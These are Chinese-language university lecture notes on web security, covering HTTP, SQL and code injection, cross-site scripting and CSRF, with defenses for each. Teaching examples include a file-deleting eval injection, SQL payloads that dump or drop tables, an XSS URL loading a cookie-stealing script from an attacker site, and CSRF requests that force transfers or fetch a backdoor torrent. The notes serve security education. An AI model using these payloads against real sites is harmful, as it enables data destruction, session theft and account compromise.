# Web安全：Injection，XSS与CSRF

### 哈尔滨工业大学 网络与信息安全 张宇 2016

---

本节课程学习针对Web服务器和浏览器的恶意攻击与防御。


## 1. Web简介

### 1.1 HTTP简介

[HTTP（Hypertext Transfer Protocol）](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol)：一种请求-应答式、无状态、客户端-服务器模式应用层协议，由Tim Berners-Lee在1989年开发，是WWW中数据通信的基础。

相关标准：

- [RFC2616: Hypertext Transfer Protocol -- HTTP/1.1](https://tools.ietf.org/html/rfc2616)
- [RFC7230: HTTP/1.1: Message Syntax and Routing](https://tools.ietf.org/html/rfc7230)
- [RFC7231: HTTP/1.1: Semantics and Content](https://tools.ietf.org/html/rfc7231)
- [RFC7232: HTTP/1.1: Conditional Requests](https://tools.ietf.org/html/rfc7232)
- [RFC7233: HTTP/1.1: Range Requests](https://tools.ietf.org/html/rfc7233)
- [RFC7234: HTTP/1.1: Caching](https://tools.ietf.org/html/rfc7234)
- [RFC7235: HTTP/1.1: Authentication](https://tools.ietf.org/html/rfc7235)
- [RFC7540: HTTP/2](https://tools.ietf.org/html/rfc7540)

HTTP请求（Request）格式：

```
[METHOD] [REQUEST-URI] HTTP/[VER]
Field1: Value1
Field2: Value2

[request body, if any]
```
- 请求方法：
	- GET：（读）获取URI指向资源
	- HEAD：（读）与GET一样，但只请求资源头部
	- POST：（改）请求服务器接受请求中包含数据
	- PUT：（增）请求服务器创建资源
	- DELETE：（删）删除指定资源
	- TRACE：（测）返回所接收到的请求
	- CONNECT：请求代理建立隧道
	- PATCH：（改）请求更改资源
	- OPTIONS：（查）返回服务器所支持方法
- 安全（safe）方法：HEAD，GET，OPTIONS，TRACE为读操作，其他方法可能改写资源是非安全方法
- 幂等操作（idempotent）：执行多次和只执行一次的效果相同，安全方法应是幂等的，PUT和DELETE也是
- 不同实现中，GET也可实现POST，PUT，DELETE效果

HTTP请求例子：

```
GET / HTTP/1.0
User-Agent: Mozilla/3.0 (compatible; Opera/3.0; Windows 95/NT4)
Accept: */*
Host: birk105.studby.uio.no:81
```

HTTP应答格式：

```
HTTP/[VER] [CODE] [TEXT]
Field1: Value1
Field2: Value2

...Document content here...
```

- 状态码（常用）：
	- 1XX：Informational
		- 100 Continue：继续提交请求负载
	- 2XX：Success
		- 200 OK
	- 3XX：Redirection
		- 300 Mutiple Choices：所请求资源有多个选择
		- 301 Moved Permanently：资源已经移动
		- 302 Found：资源临时移动
	- 4XX：Client Error
		- 400 Bad Request：请求错误
		- 403 Forbidden：拒绝响应
		- 404 Not Found
	- 5XX：Server Error
		- 500 Internal Server Error
		- 503 Service Unavailable 

HTTP应答例子：

```
HTTP/1.0 200 OK
Server: Netscape-Communications/1.1
Date: Tuesday, 25-Nov-97 01:22:04 GMT
Last-modified: Thursday, 20-Nov-97 10:44:53 GMT
Content-length: 6372
Content-type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
...followed by document content...
```

### 1.2 网页简介

- [HTML（HyperText Markup Language）](https://en.wikipedia.org/wiki/HTML)：（内容）结构化文档语言
- [CSS（Cascading Style Sheets）](https://en.wikipedia.org/wiki/Cascading_Style_Sheets)：（风格）描述文档的表现形式
- [JavaScript](https://en.wikipedia.org/wiki/JavaScript)：（程序）操纵网页的程序语言
- [DOM（Document Object Model）](https://en.wikipedia.org/wiki/Document_Object_Model)：跨平台接口来表达和交互HTML中对象，用JavaScript来操作

---

## 2. Web安全风险分类

### 2.1 风险分类

- 风险1：恶意网站破坏用户系统
	- 防御：沙箱化Javascript；避免浏览器bug；特权分离；自动更新等
- 风险2：恶意网站窃听/篡改用户与其他网站通信
	- 防御：[同源策略（same-origin policy）](https://en.wikipedia.org/wiki/Same-origin_policy)：一个网页中脚本只能访问同源的其他网页
- 风险3：攻击用户服务器上存储的数据
	- 防御：服务器安全

开源web应用安全项目(OWASP)总结的[2013年最关键Web应用安全风险Top 10](OWASP_Top_10_2013-Chinese-V1.2.pdf)：

1. 注入：恶意数据被作为命令或查询语句的一部分
- 失效的身份认证和会话管理
- 跨站脚本（XSS）：攻击者在受害者的浏览器上执行脚本
- 不安全的直接对象引用：网站开放人员暴露一个对内部实现对象的引用
- 安全配置错误：许多配置的默认值并不安全
- 敏感信息泄露：未正确保护敏感数据
- 功能级访问控制缺失：攻击者伪造请求在未经授权时访问
- 跨站请求伪造（CSRF）：令登录用户的浏览器伪造请求
- 使用含有已知漏洞的组件
- 未验证的重定向和转发：重定向受害者到钓鱼/恶意网站或访问未授权页面

---

## 3 注入攻击

[SQL注入（SQL Injection）](https://en.wikipedia.org/wiki/SQL_injection)：是一种[代码注入](https://en.wikipedia.org/wiki/Code_injection)技术，恶意SQL语句被插入到一个字段中并被执行。1998年，在黑客杂志[Phrack](https://en.wikipedia.org/wiki/Phrack)上首次披露（[文章链接](http://phrack.org/issues/54/8.html#article)）。


### 3.0 代码注入

基于`eval`（PHP）的代码注入例子：

一个计算机网站`http://site.com/calc.php`服务器上PHP代码：

```php
$exp = $_GET['exp'];
eval('$result = ' .$exp. ';');
```

- 正常计算`3+5`：`http://site.com/calc.php?exp="3+5"`
- 攻击代码：`http://site.com/calc.php?exp="3+5; system('rm *.*')"` 

一个基于`system()`的例子：

服务器PHP代码发送一封邮件：

```php
$email = $_POST["email"]$subject = $_POST["subject"]system("mail $email –s $subject < /tmp/joinmynetwork")
```
攻击代码盗窃口令：

```
http://yourdomain.com/mail.php?
  email=hacker@hackerhome.net & subject="foo < /usr/passwd; ls"
```

### 3.1 过滤escape字符错误

输入中所含特殊字符，未做转意过滤。

漏洞代码：

```sql
SELECT * FROM users WHERE name = '" + userName + "';
```

令`userName`变量为` ' OR '1'=1`或者` ' OR '1'='1' --`（注释掉其余查询）。
实际执行代码将获得所有用户，而不是特定用户：

```sql
SELECT * FROM users WHERE name = '' OR '1'='1';
or
SELECT * FROM users WHERE name = '' OR '1'='1' -- ';
```

攻击者还可以令`userName`为下面的值来删除一个表`userinfo`:

```sql
a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't'
```
实际执行命令：

```sql
SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';
```

### 3.2 类型处理错误

输入字段不是[强类型](https://en.wikipedia.org/wiki/Strong_and_weak_typing)的，或未做类型限制检查。

例如，一个字段是数字，但未检查输入是否真的是数字：

```sql
SELECT * FROM userinfo WHERE id =" + a_variable + ";
```

由于期待的输入为数字，因而攻击者可绕过上一个例子中的转移字符`'`，令`a_variable`为`1; DROP TABLE users`，导致“users”表被删除：

```sql
SELECT * FROM userinfo WHERE id=1; DROP TABLE users;
```


### 3.3 Blind SQL注入

当实施SQL注入时，注入结果对攻击者是不可见的。


**条件响应：**

一种注入攻击令数据库来计算一个显示在屏幕上的逻辑语句，通过网页响应来实施攻击。

例如，一个图书评论网站用一个[查询串（query string）](https://en.wikipedia.org/wiki/Query_string)来确定显示哪一个评论，例如`http://books.example.com/showReview.php?ID=5`。该查询串在服务器内对应的SQL命令为：

```sql
SELECT * FROM bookreviews WHERE ID = 'Value(ID)';
```

攻击者并不知道数据库、表或字段的名字，也不知道查询串，但攻击者可以构造以下URL来做个测试。

```
http://books.example.com/showReview.php?ID=5 OR 1=1
http://books.example.com/showReview.php?ID=5 AND 1=2
```

上述URL导致服务器上分别执行如下查询：

```sql
SELECT * FROM bookreviews WHERE ID = '5' OR '1'='1';
SELECT * FROM bookreviews WHERE ID = '5' AND '1'='2';
```

`1=1`的URL会查看原来的评论，`1=2`的URL会导致空页或错误页。由此，攻击者可以推断出该网站有SQL注入漏洞并实施攻击。例如推断MySQL服务器版本号：

```
http://books.example.com/showReview.php?ID=5 AND substring(@@version, 1, INSTR(@@version, '.') - 1)=4
```

对应SQL查询是：

```sql
SELECT * FROM bookreviews WHERE ID = '5' AND substring(@@version, 1, INSTR(@@version, '.') - 1)=4
```

若MySQL版本为4，则显示评论；否则显示空页或错误页。

**二阶SQL注入：**

在二阶注入中，注入的恶意命令并不被立刻执行，而是被暂时存储起来。例如，应用程序先将SQL语句正确编码并存储；应用程序中另一部分在没有注入保护的情况下执行存储的SQL语句。这需要攻击者知道被提交的值如何被使用。当前Web应用安全扫描器难以发现此类注入。

例如，一个Web应用查询用户的社保号：

```sql
SELECT ssn FROM users WHERE username=' + a_variable + ';
```

攻击者创建一个账号，用户名为`XXX' OR username='JANE`。在注册时，通过了安全检查，被录入数据库。此后，攻击者查询自己的社保号时会获得JANE的社保号。

```sql
SELECT ssn FROM users WHERE username='XXX’ OR username='JANE'
```
因为并不存在用户`XXX`，转而获得`JANE`的信息。

### 3.4 防御


- [参数化语句（parameterized statement）](https://en.wikipedia.org/wiki/Prepared_statement)在语句中使用参数，而不是直接将用户输入嵌入到语句中，令实现可以区分数据和代码。

一个Perl DBI例子：

```perl
my $stmt = $dbh->prepare('SELECT * FROM users WHERE USERNAME = ? AND PASSWORD = ?');
$stmt->execute($username, $password);
```

- 转义（Escaping）：将有特殊含义的字符做转义处理，例如在MySQL的ANSI SQL模式中每个单引号(`'`)被替换为两个单引号(`''`)。

一个PHP中使用MySQL的MySQL模式例子：

```php
$mysqli = new mysqli('hostname', 'db_username', 'db_password', 'db_name');
$query = sprintf("SELECT * FROM `Users` WHERE UserName='%s' AND Password='%s'",
                  $mysqli->real_escape_string($username),
                  $mysqli->real_escape_string($password));
$mysqli->query($query);
```

其中，`real_escape_string`函数会将特殊字符\x00, \n, \r, \, ', ", x1a（Control-Z）等等之前插入一个`\`进行转换。

- 模式检查（Pattern Check），例如检查整数，浮点数，布尔值参数格式是否正确，一些字符串是否符合特定格式，例如日期等
- 用特权分离思想限制数据库访问权限，来减小注入攻击危害范围

## 4 跨站脚本

[跨站点脚本（Cross-site scripting (XSS)）](https://en.wikipedia.org/wiki/Cross-site_scripting)：攻击者在一个网页中注入恶意客户端脚本，受害者一旦浏览该网页，则其浏览器执行该恶意脚本。也是一种代码注入。

### 4.0 同源策略

XSS攻击的一个主要优势是可以绕过[同源策略（same-origin policy）](https://en.wikipedia.org/wiki/Same-origin_policy)，即一个网站的脚本只能访问同一网站资源。

[RFC6454: The Web Origin Concept](https://tools.ietf.org/html/rfc6454)：源=协议+主机+端口

```
Origin: http://www.a.com/dir/page.html
Compared URL                       | Outcome | Reason
-------------------------------------------------------------------------------------------
http://www.a.com/dir/page2.html	  | Success | Same proto, host and port
http://www.a.com/dir2/other.html	  | Success | Same proto, host and port
http://www.a.com:81/dir/other.html | Failure | Same proto, host but diff port
https://www.a.com/dir/other.html   | Failure | Different protocol
http://en.a.com/dir/other.html     | Failure | Different host
http://a.com/dir/other.html        | Failure | Different host
http://www.a.com:80/dir/other.html | Depends | Depends on implementation
```

在XSS中，攻击脚本与被攻击网站在同一网站上。这有两种类型XSS：

- Stored XSS（持久）：攻击者将脚本注入网站，等待受害者来载入脚本
- Reflected XSS（非持久）：攻击者让用户点击一个指向恶意脚本的URL，web服务将脚本反射回来

### 4.1 存储XSS

[MySpace Samy蠕虫](http://namb.la/popular/tech.html)：利用XSS在MySpace中注入脚本，令访问MySpace页面的用户与Samy自动加为朋友。Samy成了最后欢迎的人！

1. MySpace为阻止XSS而禁用了许多标签、动作和指向脚本的连接，但一些浏览器（IE，Safari等）允许在CSS标签中包含JavaScript，例如`<div style="background:url('javascript:alert(1)')">`
- `<div>`中使用了单引号（`'`）和双引号（`"`），所以在JS中无法再使用。一种对策是用表达式来存储脚本，然后执行，例如这样使用单引号：`<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">`。
- MySpace删除任何出现的单词`javascript`，但一些浏览器将`java\nscript`解释为`javascript`
- 若要在JS中使用双引号，可使用转义双引号（`\"`），但MySpace删除转义引号。可以通过在JS中将10进制转换为ASCII来获得引号，例如`String.fromCharCode(34)`
- 此后，就是将代码注入到用户的Profile中，加好友！

[Twitter XSS漏洞](http://www.zdnet.com/article/tweetdeck-wasnt-actually-hacked-and-everyone-was-silly/)：一个tweet会被所有使用TweetDeck应用的关注者自动retweet。

```javascript
<script
class="xss">$('.xss').parents().eq(1).find('a')
.eq(1).click();$('[data-
action=retweet]').click();alert('XSS in
Tweetdeck')</script>
```

### 4.2 反射XSS

[Google.com UTF-7 XSS漏洞](http://www.securiteam.com/securitynews/6Z00L0AEUE.html)：2005年，两个Google.com上的XSS漏洞允许攻击者来伪装为Google的合法用户或实施一个钓鱼攻击，尽管Google已经采用了防范XSS的机制。

Google的URL重定向脚本将浏览器重Google重定向到其他网站，例如：`http://www.google.com/url?q=http://www.foo.com`，将重定向到`www.foo.com`。

当参数`q`格式错误时，返回`403 Forbidden`网页，该网页包含用户URL信息:

`Your client does not have permission to get URL /url?q=USER_INPUT from this server.`。

当网页不存在时，返回404网页包含不存在的URL的信息:

`Not Found The requested URL /NOTFOUND was not found on this server.`

Google服务器应答中缺乏字符集编码要求：

```
* Response headers: "Content-Type: text/html; charset=[encoding]".
* Response body: "<meta http-equiv="Content-Type" (...) charset=[encoding]/>".
```

XSS漏洞：当包含有问题URL时，Google会将XSS中常用字符进行转义，例如`<>`和`'`，但没有正确处理有威胁的UTF-7编码负载。当攻击者用UTF-7编码发送XSS攻击负载时，负载会随着应答被反射。

一个类似的例子：

1. Alice访问一个Bob的网站。Bob网站允许Alice用用户名/口令来登录并存储敏感数据，例如账单信息。当用户登录，浏览器保存授权Cookie。
- Mallory测试Bob网站是否包含一个反射XSS漏洞：
	1. 当Mallory访问Search页时，她在搜索框中输入搜索项并点击提交按钮。当搜索结果不存在时，网页显示搜索项不存在，`http://bobssite.org?q=search-term`
	2. 当提交一个异常搜索时，观察网站行为
		1. 例如所搜`<script type='text/javascript'>alert('xss');</script>`
		2. 漏洞会导致弹出一个警告窗口显示`xss`，网页显示“上述URL not found” 
- Mallory可利用该漏洞构造一个URL，其中恶意脚本在Mallory网站上
	1. 恶意URL：`http://bobssite.org?q=puppies<script%20src="http://malloryssite.com/authstealer.js"></script>`
	2. Mallory给Bob网站用户Alice发送电子邮件，包含上述恶意URL链接
- Alice收到邮件，点击链接，打开Bob网站，在浏览器上载入恶意脚本，盗取了Alice的Cookie

### 4.3 防御

- 对字符串输入进行上下文输出编码/转义：参考[OWASP的XSS防御手册](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
	1. 禁止在未允许的位置插入不可信数据，例如
		- 脚本中：`<script>...</script>` 
		- HTML元素：`<!-- ... -->`
		- attribute名：`<div ... =test />`
		- Tag名：`<... href="/test" />`
		- CSS：`<style> ... </style>`
	- 使用现成的编码/转义库和函数，	例如HTML转义函数会自动实现`& --> &amp`, `" --> &quot`, `' --> &#x27`, `< --> &lt`, `/ --> &#x2F`等等
- Cookie安全：许多XSS攻击目标是窃取Cookie，为此需要将强Cookie安全
	- 将会话cookie与用户登录时IP地址绑定，只允许从该IP地址来访问cookie
	- 一些浏览器支持cookie的[HttpOnly标记](https://en.wikipedia.org/wiki/HTTP_cookie#HttpOnly_cookie)功能，客户端脚本禁止访问设置了HttpOnly标记的cookie
- 禁用脚本，例如在[Go Static or Go Home (ACM Queue 2015)](http://queue.acm.org/detail.cfm?id=2721993)文章指出“In the end, dynamic systems are simply less secure.”
- Javascript沙箱
- [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)：显示设置网站资源白名单，例如在HTTP应答头部设置`Content-Security-Policy： default-src ‘self’`，则只允许本站资源

## 5. CSRF

[CSRF（Cross-site request forgery）](https://en.wikipedia.org/wiki/Cross-site_request_forgery)：也称为“one-click attack”，“session riding”或缩写为“XSRF”。恶意站点通过用户的浏览器以用户身份向信赖用户的网站发送请求。

- CSRF与XSS不同之处在于，后者利用用户对特定网站的信任，前者利用网站对用户浏览器的信任
- CSRF是一种针对Web的糊涂副手问题！

### 5.0 Cookie

[HTTP Cookie](https://en.wikipedia.org/wiki/HTTP_cookie)：Web服务器发送给浏览器，并被浏览器存储的一小片数据；在之后请求中携带cookie，在无状态的HTTP之上实现有状态的会话，例如用cookie存储用户登录信息（authentication cookie），存储购物车中商品，存储曾经访问过的网页（tracking cookie）等等

标准：[RFC6265: HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)

HTTP应答中设置cookie的例子：

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: theme=light
Set-Cookie: SID=31d4d96e407aad42; Expires=Wed, 09 Jun 2021 10:18:14 GMT; Secure;
```

浏览器在随后请求中包含：

```http
Cookie: SID=31d4d96e407aad42;
```

查看当前网站在Chrome浏览器中的cookie：

Chrome->View->Developer->JavaScript Console->"document.cookie"

Cookie相关术语和概念：

- 临时cookie：也叫内存cookie或，当用户关闭浏览器时，cookie自动被删除
- 持久cookie：关闭浏览器后仍被存储的cookie，直到超时，例如用于实现网站一段时间免登录
- 第三方cookie：所浏览网站的cookie，称为'第一方cookie'；所浏览网站中包含的其他网站（例如广告）的cookie，称为'第三方cookie'。通常用于跟踪用户浏览行为，例如A站和B站都包含C站的广告，用户访问A站和B站时，都会被C站设置第三方cookie
- Secure标记：要求cookie必须通过HTTPS来传递
- HttpOnly标记：禁止客户端API和脚本来访问cookie
- SameSite标记：Chrome 51中实现`SameSite`标记，只有来自相同站点的请求才能携带cookie
- Domain & Path属性：设定cookie的范围，即cookie属于哪个网站（域和路径）。缺省情况下，为所请求的域和路径（例如，"foo.com"和"/"）。
	- 当设定Domain属性为"foo.com"时，也包括所有子域，例如"docs.foo.com"（除了IE浏览器）
	- 当未设定Domain属性时，则只包括"foo.com"

### 5.1 一个虚构的盗取资金的例子

1. 用户登录到bank.com，浏览器获得认证用的cookie
- 用户访问一个恶意站点www.attacker.com
- 浏览器会发送携带用户cookie的请求，将资金转移。

示意图：

```html
www.attacker.com                          Browser                       wwww.bank.com
     |                GET /blog HTTP/1.1    |                                      |
     |<—————————————————————————————————————|                                      |
     |                                      |                                      |
 <form action=https://www.bank.com/transfer |                                      |
  method=POST target=invisibleframe>        |                                      |
  <input name=recipient value=attacker>     |                                      |
  <input name=amount value=$100> </form>    |                                      |
 <script>document.forms[0].submit()</script>|                                      |
     |————————————————————————————————————> |                                      |
     |                                      | POST /transfer HTTP/1.1              |
     |                                      | Referer: http://www.attacker.com/blog|
     |                                      | Recipient=attacker&amount=$100       |
     |                                      | Cookie: SessionID=523FA4cd2E         |
     |                                      |————————————————————————————————————> |
     |                                      |                                      |
     |                                      |                 HTTP/1.1 200 OK      |
     |                                      |<—————————————————————————————————————|
```

### 5.2 uTorrent CSRF漏洞
 
- [uTorrent](https://en.wikipedia.org/wiki/ΜTorrent) 是仅次于迅雷的最流行的BT客户端
- WebUI是一个插件，允许用户从一台计算机的浏览器上通过网络控制另一台计算机上的uTorrent，可通过`localhost:8080 `访问本机上的WebUI服务
- [CVE-2008-6586](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6586)：在WebUI 0.315中gui/index.php存在CSRF漏洞，攻击者可以强制下载任意torrent文件，或者更改管理员账号

攻击者将恶意的HTML图片元素注入到论坛或者发送垃圾邮件，例如：

```html
<img src="http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent">
```

当浏览器访问这些网页时就会自动打开链接，向uTorrent的WebUI发送携带cookie的请求。

### 5.3 Login CSRF 

参考资料：[Robust Defenses for Cross-Site Request Forgery (ACM CCS 2008)](http://www.adambarth.com/papers/2008/barth-jackson-mitchell-b.pdf)

在Login CSRF中，攻击者使用受害者浏览器来伪造一个指向目标网站登录页面的请求，携带攻击者的用户名和密码；受害者会以攻击者的身份登录到目标网站上，而浏览器中存储攻击者登录的cookie。

- 窃取搜索历史：受害者受到Login CSRF攻击，以攻击者身份登录Yahoo!或Google；以攻击者身份使用搜索引擎，搜索历史被记录在攻击者账户里
- PayPal：攻击者创建一个使用PayPal付款的恶意商家网站；受害者购买商品时被重定向到PayPal来登录账号；商家偷偷地让受害者登录到攻击者的账户；为了付款，受害者把信用卡信息录入了攻击者的账户
- iGoogle：iGoogle允许用户定制Google主页上的小插件；攻击者制作一个恶意插件并安装到自己的iGoogle主页；受害者以攻击者身份登录到攻击者的iGoogle主页，并运行恶意插件；该插件以`https://www.google.com`为源来运行，可以盗取受害者的口令
- [OpenID](https://en.wikipedia.org/wiki/OpenID)是一个开放认证平台，用户（User）可以从一个OpenID提供商（IDP）获得一个数字身份（ID），来登录支持OpenID的网站（RP，Relying Party）。由于缺乏将OpenID会话与用户浏览器绑定的机制，攻击者可以令用户浏览器已攻击者身份来初始化一个会话。
	1. 攻击者首先访问一个RP，并启动与IDP的认证过程
	- 在OpenID协议最后一步，IDP将攻击者浏览器重定向到RP的`return_to` URL
	- 但攻击者并不访问，而是令用户的浏览器来访问`return_to` URL
	- RP完成OpenID协议，在用户的浏览器中存储会话cookie，用户已经作为攻击者登录了RP

### 5.4 防御

- Secret Validation Token：由服务器生成一个随机token发送给浏览器，后续请求需携带token；没有该token的伪造请求不能得到应答
	- Token必须保证不能为预测或伪造，例如令Token=MAC(server-key, session-ID)
	- Synchronizer token pattern：将token嵌入在网页里，例如`<input type="hidden" name="csrftoken" value="KbyUmhTLMpYj7CD2" />`
	- Cookie-to-Header token：将token放入cookie `Csrf-token`中，浏览器用JS读取token并在请求时携带`X-Csrf-Token`头部，但这与HttpOnly冲突
	- 缺点：攻击者若能获取token，则可以伪装为用户
- Referer Validation：当浏览器发出请求时，携带发出请求网页的URL，来区分是同站请求还是跨站请求
	- HTTP头部[`Referer`](https://en.wikipedia.org/wiki/HTTP_referer)
	- HTTP头部[`Origin`](https://people-mozilla.org/~bsterne/content-security-policy/origin-header-proposal.html)
	- 定制头部`X-Requested-With`（RoR和Django）
	- AJAX中的[`XMLHttpRequest`](https://en.wikipedia.org/wiki/XMLHttpRequest)
	- 缺点：referer头部可能会泄露用户隐私
- 客户端保护：浏览器来阻止跨站点请求，例如FireFox和Chrome的uMatrix，
	- 缺点：也会干扰正常跨站请求
- 额外验证：[CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA)或者重新输入口令
	- 缺点：会令用户不方便

---

